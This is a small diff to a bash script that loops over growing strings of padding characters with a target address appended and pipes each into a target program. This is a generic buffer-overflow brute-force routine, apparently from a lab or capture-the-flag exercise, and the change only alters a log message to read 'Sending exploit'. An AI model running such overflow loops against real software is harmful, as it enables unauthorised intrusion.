@@ -12,7 +12,7 @@ for i in {1..100};
 	do
 		echo $i
 		garbage_data=$(yes 'a' | head -n $i | tr -d '\n')
-		echo $garbage_data$target_address
+		echo "Sending exploit: $garbage_data$target_address"
 		echo -e $garbage_data$target_address | $target_program
 		#echo -e $garbage_data$target_address | $target_server
 	done
